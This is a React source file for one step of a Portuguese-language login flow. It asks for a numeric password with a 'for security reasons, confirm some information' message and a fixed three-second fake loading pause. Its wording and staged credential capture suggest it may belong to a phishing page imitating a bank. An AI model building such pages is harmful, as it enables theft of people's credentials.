import React, { useEffect } from 'react'
import { makeStyles } from '@material-ui/core/styles';
import TextField from '@material-ui/core/TextField';
import alertify from 'alertifyjs';
import InputMask from 'react-input-mask'
import logo from '../Assets/Images/logo.png'
import Loader from '../Components/Loader';

const useStyles = makeStyles((theme) => ({
    root: {
        display: 'flex',
        flexWrap: 'wrap',
    },
    textField: {
        // marginLeft: theme.spacing(1),
        // marginRight: theme.spacing(1),
        width: '77vw',
        textAlign: 'center',
    },
}));

const Step2 = ({ nextStep, loginData, setLoginData }) => {

    const classes = useStyles();
    const [loading, setLoading] = React.useState(false)

    const onChangeSenha = e => {
        // console.log(e.target.value)
        setLoginData({ ...loginData, senha: e.target.value })
    }

    const onClick = () => { 
        if (loginData.senha === '') {
            alertify.alert('Aviso', 'Senha é Obrigatória')
        } else if (loginData.senha.length <= 18) {
            setLoading(true)
            setTimeout(() => {
                nextStep()
            }, 3000)

        }
    }

    return loading

    ? <Loader />
    :

    <div>

        <img src={logo} className="logo" />

            <div className={classes.textField}>
                <h2>Olá,</h2>

                <p>Por motivo de segurança é necessário confirmar algumas informações</p>

                <div>
                <TextField
                    label="Senha"
                    id="margin-none"
                    type="password"
                    inputMode="numeric"
                    required
                    onChange={onChangeSenha}
                    defaultValue=""
                    className={classes.textField}
                //   helperText="Some important text"
                />
            </div>

         

            <div className="botaoestilo">
                <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
            </div>

            </div>
        </div>
    
}

export default Step2